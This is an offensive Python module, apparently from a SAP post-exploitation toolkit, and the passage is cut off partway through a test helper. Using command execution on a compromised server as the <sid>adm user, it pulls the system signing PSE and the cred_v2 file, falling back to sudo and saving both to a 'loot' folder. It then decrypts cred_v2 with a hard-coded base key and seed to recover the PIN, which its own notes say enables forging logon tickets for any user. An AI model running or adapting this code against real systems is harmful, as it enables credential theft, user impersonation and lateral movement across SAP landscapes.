#!/usr/bin/env python3
"""SAPMAP — Post-exploitation extraction of the system PSE bundle.

What this module retrieves from a compromised SAP application server
when SAPMAP has OS-exec as `<sid>adm` (typically via GW SAPXPG, dpmon
SAP*, SXPG, CVE-2025-31324 webshell, or WebGUI RSBDCOS0):

    SAPSYS.pse   — the system Personal Security Environment.  Holds
                   the RSA / DSA / EC private key + self-signed cert
                   used to sign MYSAPSSO2 logon tickets.  Lives at
                   $SECUDIR/SAPSYS.pse (instance) or
                   /usr/sap/<SID>/SYS/global/security/data/SAPSYS.pse
                   (global, for HA / multi-instance landscapes).

    cred_v2      — SAP "SSO credential" file holding the PSE PIN.
                   Lives at $SECUDIR/cred_v2 alongside SAPSYS.pse.
                   ASN.1-wrapped, payload encrypted with a key
                   derived from the OS user name running the SAP
                   workprocess.  Any process running as `<sid>adm`
                   can decrypt this file with NO further auth — the
                   lateral-movement gift.

Together these two files let SAPMAP forge MYSAPSSO2 logon tickets
impersonating any user, replayable against every system in the
STRUSTSSO2 trust subgraph — see SAP Note 869962 + the
sap_mysapsso2 module that consumes the output of this one.

This module is commit 1 of the ticket-forgery series.  Pure
extraction primitive — decryption + key parsing live in subsequent
commits (sap_pse_loot.decrypt_cred_v2,
sap_pse_loot.extract_signing_key).

Caller-supplied `gw_exec_fn(program, args) -> dict` adapts to any
SAPMAP OS-exec channel; the shape matches execute_gw_command /
execute_local_command / chunked_drop_and_run's GwExecFn.  Module
contains no network code, no RFC code, no GUI code — fully testable
without a live SAP system.
"""

from __future__ import annotations

import base64
import hashlib
import os
import re
import struct
import time
from typing import Callable, Optional


# Shape matches sap_dpmon_sapstar.GwExecFn intentionally — both
# accept the same exec-channel adapter from upstream callers.
GwExecFn = Callable[[str, str], dict]


# ---------------------------------------------------------------------------
# Standard SECUDIR / PSE paths
# ---------------------------------------------------------------------------
#
# SAP layout convention (per Note 1037564 / sec/libsapsecu docs):
#
#   /usr/sap/<SID>/<INST_DIR>/sec/                  — per-instance SECUDIR
#       SAPSYS.pse                                  — system signing PSE
#       cred_v2                                     — PSE PIN credential
#       SAPSSLS.pse / SAPSSLC.pse / SAPSSLA.pse     — TLS PSEs (out of scope)
#
#   /usr/sap/<SID>/SYS/global/security/data/        — global / HA-shared
#       SAPSYS.pse                                  — same content as instance
#
# On a single-instance system the global path is usually a symlink to the
# per-instance one.  On HA installs each instance writes to its own copy.
# We try the per-instance path first (specific to the dispatcher we exploited),
# then fall back to the global path for HA layouts.

DEFAULT_PSE_FILENAMES = ("SAPSYS.pse",)
DEFAULT_CRED_FILENAMES = ("cred_v2",)


def _instance_secudir(sid: str, instance_dir: str) -> str:
    """Return the per-instance SECUDIR path for `<SID>` + `<INST_DIR>`.

    `instance_dir` is the dispatcher's directory name (e.g. "D00",
    "DVEBMGS01", "ASCS00") — not just the 2-digit instance number.
    Path layout is uniform across NW 7.0x → 7.5x.
    """
    return f"/usr/sap/{sid.upper()}/{instance_dir}/sec"


def _global_secudir(sid: str) -> str:
    """Return the global/HA-shared SECUDIR path for `<SID>`."""
    return f"/usr/sap/{sid.upper()}/SYS/global/security/data"


def candidate_secudirs(sid: str, instance_dir: str) -> list:
    """Ordered list of paths to try when locating SAPSYS.pse + cred_v2.

    Per-instance first (matches the dispatcher we have OS-exec on),
    global second (HA-shared layout, sometimes the only one populated
    on systems where the instance copy is just a symlink that we'd
    rather skip indirection on).
    """
    return [
        _instance_secudir(sid, instance_dir),
        _global_secudir(sid),
    ]


# ---------------------------------------------------------------------------
# Shell-line interpretation helpers
# ---------------------------------------------------------------------------

# Lines emitted by `base64 <missing-file>` or `sudo base64 <missing-file>`
# that mean "file not there / not readable" rather than "successful read".
# These never appear in legitimate base64 output (alphabet is A-Za-z0-9+/=
# plus newline).
_BASE64_ERROR_MARKERS = (
    "No such file",
    "Permission denied",
    "not found",
    "sudo:",
    "[sudo]",
    "a password is required",
    "is a directory",
    "cannot open",
)


def _looks_like_error(text: str) -> bool:
    """True if `text` contains any of the standard base64 / sudo error
    markers — distinct from legitimate empty output (file exists but
    is zero-byte, see _read_b64 in sapmap_copyfail.py)."""
    if not text:
        return False
    lower = text.lower()
    return any(m.lower() in lower for m in _BASE64_ERROR_MARKERS)


def _decode_b64_lines(lines: list) -> Optional[bytes]:
    """Decode an output blob from `base64 <file>` into raw bytes.

    `base64` (coreutils) by default wraps at 76 columns; each line is
    pure A-Za-z0-9+/= plus optional padding.  We strip whitespace and
    concatenate before decoding.  Returns None on any decode error
    (which usually means we picked up an error line and tried to
    base64-decode it — the caller's error path handles this).
    """
    if not lines:
        return None
    blob = "".join(ln.strip() for ln in lines)
    if not blob:
        return b""
    try:
        return base64.b64decode(blob, validate=True)
    except Exception:
        return None


# ---------------------------------------------------------------------------
# File-read primitives via the GW exec channel
# ---------------------------------------------------------------------------

def _read_file_b64(gw_exec_fn: GwExecFn, path: str,
                    try_sudo: bool = True) -> dict:
    """Read `path` on the target through the gw_exec_fn channel.

    Returns dict:
        {success, bytes, error, raw_output}

    bytes is the decoded file content on success; raw_output is the
    last gw_exec_fn `output` list for diagnostics.

    `try_sudo`: if the first plain `base64 <path>` fails with a
    permission-denied or not-found marker, retry as `sudo base64
    <path>` — same pattern sapmap_copyfail._read_b64 uses for the
    rare case where <sid>adm doesn't have read access (e.g.,
    SAPSYS.pse on a hardened install where root-only ACLs were set).
    """
    result = {"success": False, "bytes": None, "error": "",
              "raw_output": []}

    # First attempt: plain `base64 <path>`
    r = gw_exec_fn("base64", path)
    result["raw_output"] = r.get("output", [])
    output_text = "\n".join(result["raw_output"])

    if r.get("success") and not _looks_like_error(output_text):
        data = _decode_b64_lines(result["raw_output"])
        if data is not None:
            result["success"] = True
            result["bytes"] = data
            return result

    # Remember original error before trying sudo — it's usually more
    # informative ("No such file") than the sudo fallback error
    # ("a password is required").
    orig_error = ""
    if _looks_like_error(output_text):
        orig_error = output_text.strip().splitlines()[0][:200]

    # Plain read failed.  Try sudo if requested.
    if try_sudo:
        r2 = gw_exec_fn("sudo", f"base64 {path}")
        sudo_output = r2.get("output", [])
        sudo_text = "\n".join(sudo_output)
        if r2.get("success") and not _looks_like_error(sudo_text):
            data = _decode_b64_lines(sudo_output)
            if data is not None:
                result["success"] = True
                result["bytes"] = data
                result["raw_output"] = sudo_output
                return result

    # Both attempts failed — prefer original error (more informative)
    if orig_error:
        result["error"] = orig_error
    elif _looks_like_error(output_text):
        result["error"] = output_text.strip().splitlines()[0][:200]
    else:
        result["error"] = (f"base64 returned non-decodable output "
                            f"({len(output_text)}B)")
    return result


def _list_dir(gw_exec_fn: GwExecFn, path: str) -> list:
    """Return list of filenames in `path` (empty list on failure).

    Used for discovery — when we don't know which SECUDIR variant
    holds the live PSE on a given system, ls each candidate and
    pick the one that actually contains SAPSYS.pse + cred_v2.
    """
    r = gw_exec_fn("ls", path)
    if not r.get("success"):
        return []
    names = []
    for line in r.get("output", []):
        line = line.strip()
        if not line or _looks_like_error(line):
            continue
        # ls can return one file per line; on some shells columns are
        # space-separated.  Split on whitespace to be safe.
        names.extend(line.split())
    return names


# ---------------------------------------------------------------------------
# Loot-dir handling
# ---------------------------------------------------------------------------

def _save_to_loot(bundle: dict, sid: str) -> dict:
    """Persist the extracted bundle into the loot directory.

    Writes:
        loot/pse/<SID>_<timestamp>/SAPSYS.pse
        loot/pse/<SID>_<timestamp>/cred_v2
        loot/pse/<SID>_<timestamp>/_meta.txt  (provenance info)

    Returns the relative loot path under `loot/pse/`.  This is a
    pure side-effect — the bundle dict in memory is the source of
    truth for downstream commits.  Loot files exist so the
    operator can run sapgenpse / OpenSSL against them outside
    SAPMAP if desired (or re-import after a SAPMAP restart).
    """
    try:
        from sapmap_state import ensure_loot_dir
    except ImportError:
        return {"saved": False,
                "error": "sapmap_state not importable",
                "loot_path": ""}

    base = ensure_loot_dir("pse")
    ts = time.strftime("%Y%m%d_%H%M%S")
    subdir = os.path.join(base, f"{sid.upper()}_{ts}")
    try:
        os.makedirs(subdir, exist_ok=True)
        if bundle.get("pse_bytes"):
            with open(os.path.join(subdir, "SAPSYS.pse"), "wb") as f:
                f.write(bundle["pse_bytes"])
        if bundle.get("cred_v2_bytes"):
            with open(os.path.join(subdir, "cred_v2"), "wb") as f:
                f.write(bundle["cred_v2_bytes"])
        with open(os.path.join(subdir, "_meta.txt"), "w") as f:
            f.write(f"SAPMAP PSE extraction\n")
            f.write(f"SID         : {sid}\n")
            f.write(f"Extracted at: {ts}\n")
            f.write(f"SECUDIR     : {bundle.get('secudir', '?')}\n")
            f.write(f"sidadm user : {bundle.get('sidadm_user', '?')}\n")
            f.write(f"PSE size    : {len(bundle.get('pse_bytes') or b'')}B\n")
            f.write(f"cred_v2 size: {len(bundle.get('cred_v2_bytes') or b'')}B\n")
            other = bundle.get("other_files") or []
            if other:
                f.write(f"Other files in SECUDIR (not retrieved):\n")
                for name in other:
                    f.write(f"  - {name}\n")
        return {"saved": True, "error": "", "loot_path": subdir}
    except Exception as e:
        return {"saved": False, "error": str(e), "loot_path": subdir}


# ---------------------------------------------------------------------------
# Public API — extract_pse_bundle
# ---------------------------------------------------------------------------

def extract_pse_bundle(gw_exec_fn: GwExecFn, sid: str,
                        instance_dir: str = "D00",
                        secudir: Optional[str] = None,
                        save_loot: bool = True,
                        label: str = "") -> dict:
    """Extract SAPSYS.pse + cred_v2 from a compromised SAP host.

    Args:
        gw_exec_fn: Callable wrapping any SAPMAP OS-exec channel
                    (GW SAPXPG, SXPG, dpmon's PTY path, etc.).
                    Receives (program, args) and returns
                    {success, output, error}.  Must run as <sid>adm
                    (or root) on the target.
        sid:        SAP system ID (e.g. "S4H").
        instance_dir: Dispatcher's directory name on disk -- "D00",
                    "DVEBMGS00", "ASCS01", etc.  Defaults to "D00"
                    for the most common ABAP dialog instance.  When
                    unknown, pass any string and the global SECUDIR
                    fallback handles it.
        secudir:    Optional explicit SECUDIR override.  When None
                    (default), the function tries per-instance
                    first, then global.
        save_loot:  Save the extracted bytes to loot/pse/<sid>_<ts>/
                    for offline analysis (default True).
        label:      Optional log-prefix label (typically node.sid).

    Returns:
        {
            success      : bool,
            pse_bytes    : bytes | None,
            cred_v2_bytes: bytes | None,
            secudir      : str (the path that worked),
            sidadm_user  : str (whoami output, used by cred_v2 decryptor),
            other_files  : list[str] (rest of $SECUDIR ls, surfaced as
                           info -- some installs put PSEs under
                           non-standard names like SAPSYS_ABAP.pse),
            loot_path    : str (where the bytes were saved on disk),
            error        : str (human-readable failure reason),
        }
    """
    tag = f"[*] {label}: pse_loot" if label else "[*] pse_loot"
    result = {
        "success": False,
        "pse_bytes": None,
        "cred_v2_bytes": None,
        "secudir": "",
        "sidadm_user": "",
        "other_files": [],
        "loot_path": "",
        "error": "",
    }

    # Step 1: who am I (cred_v2 needs the OS user name as part of
    # the key-derivation input; this is the deciding piece).
    r_id = gw_exec_fn("whoami", "")
    if r_id.get("success"):
        out = "\n".join(r_id.get("output", [])).strip()
        first = out.splitlines()[0].strip() if out else ""
        if first and not _looks_like_error(first):
            result["sidadm_user"] = first
            print(f"{tag}: OS identity = {first!r}")
    if not result["sidadm_user"]:
        # Best-effort fallback: typical <sid>adm convention.
        result["sidadm_user"] = f"{sid.lower()}adm"
        print(f"{tag}: whoami failed -- assuming "
              f"{result['sidadm_user']!r} (standard <sid>adm convention)")

    # Step 2: locate SECUDIR — try the candidates in order.
    candidates = ([secudir] if secudir
                  else candidate_secudirs(sid, instance_dir))
    print(f"{tag}: SECUDIR candidates: {candidates}")

    chosen_dir = ""
    listing = []
    for candidate in candidates:
        print(f"{tag}: probing {candidate} ...")
        files = _list_dir(gw_exec_fn, candidate)
        if not files:
            print(f"{tag}:   empty / unreadable")
            continue
        # Does this SECUDIR contain BOTH the PSE and cred file?
        has_pse = any(f in files for f in DEFAULT_PSE_FILENAMES)
        has_cred = any(f in files for f in DEFAULT_CRED_FILENAMES)
        print(f"{tag}:   {len(files)} entries; SAPSYS.pse="
              f"{has_pse}, cred_v2={has_cred}")
        if has_pse and has_cred:
            chosen_dir = candidate
            listing = files
            break
        if has_pse and not chosen_dir:
            # Fall-back: PSE without matching cred file is still
            # useful (e.g. when cred_v2 was renamed); remember it
            # but keep searching for a full match.
            chosen_dir = candidate
            listing = files

    if not chosen_dir:
        result["error"] = (
            f"no SECUDIR with SAPSYS.pse found "
            f"(tried {len(candidates)} path(s))")
        print(f"{tag}: ABORT — {result['error']}")
        return result

    result["secudir"] = chosen_dir
    result["other_files"] = [
        f for f in listing
        if f not in DEFAULT_PSE_FILENAMES
        and f not in DEFAULT_CRED_FILENAMES
    ]
    print(f"{tag}: SECUDIR = {chosen_dir} (contains {len(listing)} files)")

    # Step 3: read the PSE
    pse_path = os.path.join(chosen_dir, "SAPSYS.pse")
    print(f"{tag}: reading {pse_path} via base64 ...")
    r_pse = _read_file_b64(gw_exec_fn, pse_path)
    if not r_pse["success"]:
        result["error"] = f"SAPSYS.pse read failed: {r_pse['error']}"
        print(f"{tag}: ABORT — {result['error']}")
        return result
    result["pse_bytes"] = r_pse["bytes"]
    print(f"{tag}: SAPSYS.pse retrieved ({len(r_pse['bytes'])}B)")

    # Step 4: read cred_v2 (best-effort — its absence isn't fatal
    # at extract time; the operator can supply the PIN manually if
    # cred_v2 lives somewhere unusual)
    cred_path = os.path.join(chosen_dir, "cred_v2")
    if "cred_v2" in listing:
        print(f"{tag}: reading {cred_path} via base64 ...")
        r_cred = _read_file_b64(gw_exec_fn, cred_path)
        if r_cred["success"]:
            result["cred_v2_bytes"] = r_cred["bytes"]
            print(f"{tag}: cred_v2 retrieved "
                  f"({len(r_cred['bytes'])}B)")
        else:
            print(f"{tag}: cred_v2 read failed: {r_cred['error']} "
                  f"-- continuing without it; operator can supply "
                  f"PIN manually")
    else:
        print(f"{tag}: cred_v2 not present in SECUDIR -- continuing "
              f"without it; operator can supply PIN manually")

    result["success"] = True

    # Step 5: persist to loot dir
    if save_loot:
        save_r = _save_to_loot(result, sid)
        result["loot_path"] = save_r["loot_path"]
        if save_r["saved"]:
            print(f"{tag}: loot saved to {save_r['loot_path']}")
        else:
            print(f"{tag}: loot save failed ({save_r['error']}) "
                  f"-- bytes still available in returned dict")

    return result


# ===================================================================
# Commit 2 — cred_v2 decryption (PSE PIN recovery)
# ===================================================================
#
# The cred_v2 file stores the PIN for the PSE file, encrypted with a
# key derived from the OS username running the SAP workprocesses.
# Any process running as <sid>adm can recover the PIN with zero
# additional authentication — this is the lateral-movement gift that
# makes MYSAPSSO2 ticket forgery possible.
#
# Two cipher format versions exist:
#   - Format 0 (legacy): simple 3DES-CBC, key = format_string % user
#   - Format 1 (modern): header with salt/IV, SHA-256 key derivation,
#     3DES-CBC (algo=0) or AES-256-CBC (algo=1)
#
# The outer file is BER-encoded ASN.1: a SEQUENCE of credential
# records, each containing the PSE path + encrypted cipher blob.
# After decryption + LCG deobfuscation, the inner payload is also
# BER-encoded: SEQUENCE { IA5String(pin) [, optional fields] }.
#
# Clean-room implementation based on public SAP documentation,
# SAP Note 2115486, and the OWASP CBAS project's format description.
# ===================================================================


# ---------------------------------------------------------------------------
# Minimal BER (Basic Encoding Rules) parser / builder
# ---------------------------------------------------------------------------
# Only handles the subset of ASN.1 used by cred_v2: SEQUENCE,
# IA5String, UTF8String, INTEGER, BIT STRING, OCTET STRING.
# No indefinite-length, no multi-byte tags, no SET sorting.

_BER_INTEGER = 0x02
_BER_BITSTRING = 0x03
_BER_OCTETSTRING = 0x04
_BER_IA5STRING = 0x16
_BER_UTF8STRING = 0x0C
_BER_SEQUENCE = 0x30
_BER_SET = 0x31


def _ber_read_tl(data: bytes, offset: int):
    """Read one BER tag + length at *offset*.

    Returns ``(tag, val_offset, val_len, next_offset)`` where
    *val_offset* is the index of the first value byte and
    *next_offset* is the first byte past this TLV.

    Raises ``ValueError`` on truncated / malformed input.
    """
    if offset >= len(data):
        raise ValueError(f"BER: offset {offset} past end of {len(data)}B")
    tag = data[offset]
    pos = offset + 1
    if pos >= len(data):
        raise ValueError("BER: truncated after tag byte")
    first_len = data[pos]
    pos += 1
    if first_len < 0x80:
        val_len = first_len
    elif first_len == 0x80:
        raise ValueError("BER: indefinite length not supported")
    else:
        n_bytes = first_len & 0x7F
        if pos + n_bytes > len(data):
            raise ValueError("BER: truncated length field")
        val_len = int.from_bytes(data[pos:pos + n_bytes], "big")
        pos += n_bytes
    return tag, pos, val_len, pos + val_len


def _ber_children(data: bytes, start: int, end: int):
    """Yield ``(tag, value_bytes)`` for each TLV inside a constructed
    element spanning ``data[start:end]``."""
    pos = start
    while pos < end:
        tag, voff, vlen, nxt = _ber_read_tl(data, pos)
        yield tag, data[voff:voff + vlen]
        pos = nxt


def _ber_encode_tl(tag: int, length: int) -> bytes:
    """Encode a BER tag + length header (no value)."""
    if length < 0x80:
        return bytes([tag, length])
    elif length < 0x100:
        return bytes([tag, 0x81, length])
    elif length < 0x10000:
        return bytes([tag, 0x82, (length >> 8) & 0xFF, length & 0xFF])
    else:
        return bytes([tag, 0x83,
                      (length >> 16) & 0xFF,
                      (length >> 8) & 0xFF,
                      length & 0xFF])


def _ber_tlv(tag: int, value: bytes) -> bytes:
    """Encode a complete TLV."""
    return _ber_encode_tl(tag, len(value)) + value


# ---------------------------------------------------------------------------
# LCG-based XOR stream
# ---------------------------------------------------------------------------
# SAP's cred_v2 uses a Linear Congruential Generator as a
# deterministic byte stream for XOR obfuscation.  The LCG parameters
# match the classic Numerical Recipes / MINSTD constants hard-coded
# in CommonCryptoLib.

_LCG_MUL = 0x15A4E35
_LCG_INC = 1


def _lcg_xor(data: bytes, seed: int) -> bytes:
    """XOR each byte of *data* with successive LCG outputs.

    The LCG state advances *before* each byte:
        state = (state * 0x15A4E35 + 1) mod 2^32
        out[i] = data[i] ^ (state & 0xFF)

    So the seed itself is never used directly as a key byte.
    """
    state = seed & 0xFFFFFFFF
    out = bytearray(len(data))
    for i in range(len(data)):
        state = (state * _LCG_MUL + _LCG_INC) & 0xFFFFFFFF
        out[i] = data[i] ^ (state & 0xFF)
    return bytes(out)


# ---------------------------------------------------------------------------
# cred_v2 format constants
# ---------------------------------------------------------------------------

# Base key embedded in CommonCryptoLib (sapgenpse).  Contains a
# literal ``%s`` at byte offset 14-15 that format-0 replaces with
# the OS username via printf-style formatting.  Format-1 feeds the
# raw bytes (including the ``%s``) into SHA-256 and incorporates the
# username separately through the LCG-XOR step.
_CRED_KEY_FMT = (b"240657rsga&/%srwthgrtawe45hhtrtrsr"
                 b"35467b2dx3456j67mv67f89656f75")

# Post-decryption XOR seed — applied after CBC decrypt to recover
# the cleartext from the obfuscated intermediate.
_POST_DECRYPT_SEED = 0x64FB914E


# ---------------------------------------------------------------------------
# cred_v2 outer envelope parser
# ---------------------------------------------------------------------------

class _CredRecord:
    """One credential entry from the cred_v2 file."""
    __slots__ = ("pse_path", "cipher_bytes", "is_lps", "raw_fields")

    def __init__(self, pse_path: str, cipher_bytes: bytes,
                 is_lps: bool = False, raw_fields: list = None):
        self.pse_path = pse_path
        self.cipher_bytes = cipher_bytes
        self.is_lps = is_lps
        self.raw_fields = raw_fields or []


def _parse_cred_v2_envelope(blob: bytes) -> list:
    """Parse the outer BER of a cred_v2 file into credential records.

    The file is a BER SEQUENCE OF credential records.  Each record is
    itself a SEQUENCE whose first child distinguishes the format:

    **Non-LPS** (first child is IA5String):
        ``SEQUENCE { IA5(name), IA5(?), IA5(pse_path), IA5(?), BITSTRING(cipher) }``

    **LPS** (first child is INTEGER with value 2):
        ``SEQUENCE { INT(2), SEQUENCE(subject), UTF8(pse_path), BITSTRING(cipher) }``

    Returns a list of :class:`_CredRecord`.
    """
    records = []
    # Outer wrapper is a SEQUENCE
    tag, voff, vlen, _ = _ber_read_tl(blob, 0)
    if tag != _BER_SEQUENCE:
        raise ValueError(f"cred_v2: expected outer SEQUENCE (0x30), "
                         f"got 0x{tag:02X}")

    # Each child of the outer SEQUENCE is one credential record
    for ctag, cval in _ber_children(blob, voff, voff + vlen):
        if ctag != _BER_SEQUENCE:
            continue  # skip unexpected elements
        # Parse children of this credential SEQUENCE
        children = list(_ber_children(cval, 0, len(cval)))
        if not children:
            continue

        first_tag = children[0][0]
        if first_tag == _BER_INTEGER:
            # LPS variant
            pse_path = ""
            cipher_bytes = b""
            for i, (t, v) in enumerate(children):
                if t == _BER_UTF8STRING:
                    pse_path = v.decode("utf-8", errors="replace")
                elif t == _BER_BITSTRING:
                    cipher_bytes = v[1:] if v and v[0] == 0 else v
            records.append(_CredRecord(pse_path, cipher_bytes,
                                       is_lps=True))
        else:
            # Non-LPS: expect IA5, IA5, IA5(path), IA5, BITSTRING
            ia5_fields = []
            cipher_bytes = b""
            for t, v in children:
                if t == _BER_IA5STRING:
                    ia5_fields.append(
                        v.decode("ascii", errors="replace"))
                elif t == _BER_BITSTRING:
                    # BIT STRING: first byte = unused-bit count (0)
                    cipher_bytes = (v[1:] if v and v[0] == 0
                                    else v)
            pse_path = (ia5_fields[2] if len(ia5_fields) > 2
                        else "")
            records.append(_CredRecord(pse_path, cipher_bytes,
                                       is_lps=False,
                                       raw_fields=ia5_fields))
    return records


# ---------------------------------------------------------------------------
# Key derivation + decryption
# ---------------------------------------------------------------------------

def _derive_and_decrypt_v0(cipher: bytes, username: str) -> bytes:
    """Decrypt a format-0 (legacy, simple 3DES) cipher blob.

    Key = ``(base_key_fmt % username)[:24]``, IV = 8 zero bytes.
    """
    try:
        from cryptography.hazmat.primitives.ciphers import (
            Cipher, modes)
        try:
            from cryptography.hazmat.decrepit.ciphers.algorithms \
                import TripleDES
        except ImportError:
            from cryptography.hazmat.primitives.ciphers.algorithms \
                import TripleDES
    except ImportError as e:
        raise RuntimeError(
            f"cryptography library not available: {e}")

    # printf-style: %s in the base key gets replaced with username
    fmt_str = _CRED_KEY_FMT.decode("ascii")
    key_material = (fmt_str % username).encode("ascii")
    key = key_material[:24]
    iv = b"\x00" * 8

    # Pad to 3DES block size (8) if needed — shouldn't happen with
    # well-formed blobs but be defensive
    if len(cipher) % 8 != 0:
        cipher = cipher + b"\x00" * (8 - len(cipher) % 8)

    dec = Cipher(TripleDES(key), modes.CBC(iv)).decryptor()
    return dec.update(cipher) + dec.finalize()


def _derive_and_decrypt_v1(cipher_blob: bytes,
                            username: str) -> bytes:
    """Decrypt a format-1 (header-based) cipher blob.

    The 36-byte header layout:
        [0]       version (1)
        [1]       algorithm: 0 = 3DES, 1 = AES-256
        [2:4]     reserved (zeroes)
        [4:20]    salt (16 bytes)
        [20:36]   iv   (16 bytes)
        [36:]     ciphertext

    Key derivation:
        sha256(base_key || blob[0:4] || salt ||
               lcg_xor(username, salt[0]))
        then lcg_xor(digest, salt[1]).
    """
    try:
        from cryptography.hazmat.primitives.ciphers import (
            Cipher, algorithms, modes)
        try:
            from cryptography.hazmat.decrepit.ciphers.algorithms \
                import TripleDES
        except ImportError:
            from cryptography.hazmat.primitives.ciphers.algorithms \
                import TripleDES
    except ImportError as e:
        raise RuntimeError(
            f"cryptography library not available: {e}")

    if len(cipher_blob) < 36:
        raise ValueError(
            "format-1 cipher blob too short for 36B header")

    algo_byte = cipher_blob[1]
    salt = cipher_blob[4:20]
    iv_field = cipher_blob[20:36]
    ciphertext = cipher_blob[36:]

    # --- Key derivation via SHA-256 ---
    user_bytes = username.encode("ascii")
    xored_user = _lcg_xor(user_bytes, salt[0])

    h = hashlib.sha256()
    h.update(_CRED_KEY_FMT)       # full base key (including %s)
    h.update(cipher_blob[0:4])    # version + algo + reserved
    h.update(salt)                # 16-byte salt
    h.update(xored_user)          # XOR'd username
    digest = h.digest()           # 32 bytes

    derived = _lcg_xor(digest, salt[1])

    # --- Determine algorithm + actual IV/ciphertext ---
    if algo_byte == 0:
        # 3DES: iv_field[:8] is the actual IV;
        # iv_field[8:] prepends ciphertext
        actual_iv = iv_field[:8]
        actual_ct = iv_field[8:] + ciphertext
        key = derived[:24]
        if len(actual_ct) % 8 != 0:
            actual_ct += b"\x00" * (8 - len(actual_ct) % 8)
        dec = Cipher(TripleDES(key),
                     modes.CBC(actual_iv)).decryptor()
    elif algo_byte == 1:
        # AES-256-CBC: full 16-byte IV, full 32-byte key
        actual_iv = iv_field
        actual_ct = ciphertext
        key = derived[:32]
        if len(actual_ct) % 16 != 0:
            actual_ct += b"\x00" * (16 - len(actual_ct) % 16)
        dec = Cipher(algorithms.AES(key),
                     modes.CBC(actual_iv)).decryptor()
    else:
        raise ValueError(
            f"unsupported cipher algorithm byte: "
            f"0x{algo_byte:02X}")

    return dec.update(actual_ct) + dec.finalize()


def _strip_pkcs5(data: bytes) -> bytes:
    """Strip PKCS5/PKCS7 padding from decrypted CBC output.

    Returns *data* unchanged if the trailing bytes don't look like
    valid padding (defensive — real cred_v2 should always be padded).
    """
    if not data:
        return data
    pad_len = data[-1]
    if pad_len < 1 or pad_len > 16:
        return data
    if len(data) < pad_len:
        return data
    if all(b == pad_len for b in data[-pad_len:]):
        return data[:-pad_len]
    return data


def _decrypt_cipher_blob(cipher_bytes: bytes,
                          username: str) -> bytes:
    """Auto-detect format version and decrypt.

    Returns the raw decrypted bytes (still XOR-obfuscated — caller
    must apply post-decrypt XOR with ``_POST_DECRYPT_SEED``).
    """
    if not cipher_bytes:
        raise ValueError("empty cipher blob")

    # Format detection (matches CommonCryptoLib's logic):
    # format-1 if blob >= 36 bytes and first byte is 0 or 1.
    if len(cipher_bytes) >= 36 and cipher_bytes[0] in (0, 1):
        return _derive_and_decrypt_v1(cipher_bytes, username)
    else:
        return _derive_and_decrypt_v0(cipher_bytes, username)


def _extract_pin_from_plaintext(plain: bytes) -> str:
    """Parse the BER-encoded decrypted payload to extract the PIN.

    Expected structure:
        ``SEQUENCE { IA5String(pin) [, IA5String(opt1) ...] }``

    Falls back to raw Latin-1 decode if BER parsing fails — some
    format-0 blobs store the PIN as a plain string without ASN.1.
    """
    # Try BER parse first
    try:
        tag, voff, vlen, _ = _ber_read_tl(plain, 0)
        if tag == _BER_SEQUENCE:
            for ctag, cval in _ber_children(
                    plain, voff, voff + vlen):
                if ctag in (_BER_IA5STRING, _BER_UTF8STRING,
                            _BER_OCTETSTRING):
                    enc = ("utf-8" if ctag == _BER_UTF8STRING
                           else "ascii")
                    pin = cval.decode(enc, errors="replace")
                    return pin.rstrip("\x00")
    except (ValueError, IndexError):
        pass

    # Fallback: first printable run
    text = plain.decode("latin-1", errors="replace")
    cleaned = "".join(c for c in text
                      if 0x20 <= ord(c) < 0x7F)
    return cleaned if cleaned else ""


# ---------------------------------------------------------------------------
# Public API — decrypt_cred_v2
# ---------------------------------------------------------------------------

def decrypt_cred_v2(cred_v2_bytes: bytes, sidadm_user: str,
                    pse_path: Optional[str] = None) -> dict:
    """Decrypt a cred_v2 file and recover the PSE PIN.

    Args:
        cred_v2_bytes: Raw cred_v2 file content (as extracted by
                       :func:`extract_pse_bundle`).
        sidadm_user:   OS username (e.g. ``"s4hadm"``) — the key
                       derivation input.  Typically
                       ``bundle["sidadm_user"]`` from commit 1.
        pse_path:      Optional PSE path to match against.  When
                       provided, only the credential whose
                       ``pse_path`` field contains this substring
                       is decrypted.  When ``None``, all non-LPS
                       credentials are tried and the first
                       successful decryption wins.

    Returns:
        ``{success, pin, pse_path, error, credentials}``

        *pin* is the cleartext PSE PIN string on success.
        *credentials* is a list of dicts describing every record
        found in the file (for operator visibility).
    """
    result = {
        "success": False,
        "pin": "",
        "pse_path": "",
        "error": "",
        "credentials": [],
    }

    if not cred_v2_bytes:
        result["error"] = "empty cred_v2 blob"
        return result

    # Step 1: parse outer envelope
    try:
        records = _parse_cred_v2_envelope(cred_v2_bytes)
    except (ValueError, IndexError) as e:
        result["error"] = f"BER parse failed: {e}"
        return result

    if not records:
        result["error"] = "no credential records found in cred_v2"
        return result

    # Surface all records for operator visibility
    for rec in records:
        result["credentials"].append({
            "pse_path": rec.pse_path,
            "cipher_len": len(rec.cipher_bytes),
            "is_lps": rec.is_lps,
        })

    # Step 2: try to decrypt matching records
    for rec in records:
        if rec.is_lps:
            continue  # LPS = DPAPI/TPM — not yet supported

        if pse_path and pse_path not in rec.pse_path:
            continue  # path filter — skip non-matching

        if not rec.cipher_bytes:
            continue

        try:
            raw_decrypted = _decrypt_cipher_blob(
                rec.cipher_bytes, sidadm_user)
        except Exception:
            continue  # decryption failed — try next record

        # Strip PKCS5/PKCS7 padding, then XOR deobfuscation
        unpadded = _strip_pkcs5(raw_decrypted)
        deobfuscated = _lcg_xor(unpadded,
                                _POST_DECRYPT_SEED)

        # Extract PIN from the cleartext
        pin = _extract_pin_from_plaintext(deobfuscated)
        if pin:
            result["success"] = True
            result["pin"] = pin
            result["pse_path"] = rec.pse_path
            return result

    # No record yielded a valid PIN
    lps_count = sum(1 for r in records if r.is_lps)
    if lps_count == len(records):
        result["error"] = (
            f"all {lps_count} credential(s) use LPS "
            f"(DPAPI/TPM) — not yet supported")
    elif pse_path:
        result["error"] = (
            f"no credential matching path '{pse_path}' could "
            f"be decrypted ({len(records)} record(s) in file)")
    else:
        result["error"] = (
            f"decryption failed for all "
            f"{len(records)} credential(s)")
    return result


# ---------------------------------------------------------------------------
# Test helpers — cred_v2 blob builder (encrypt direction)
# ---------------------------------------------------------------------------
# In the main module so tests import them without duplicating the
# BER / crypto logic.  They implement the *encryption* direction
# (the reverse of decrypt_cred_v2) to construct synthetic cred_v2
# blobs with known PINs for round-trip verification.

def _build_cred_v2_blob(pin: str, pse_path: str,
                         username: str, algo: int = 0,
                         salt: bytes = None,
                         iv: bytes = None) -> bytes:
    """Build a synthetic cred_v2 file for testing.

    Creates a single non-LPS credential record with the given PIN,
    encrypted with the standard key derivation.

    Args:
        pin:      The PSE PIN to encrypt.
        pse_path: PSE path for the credential record.
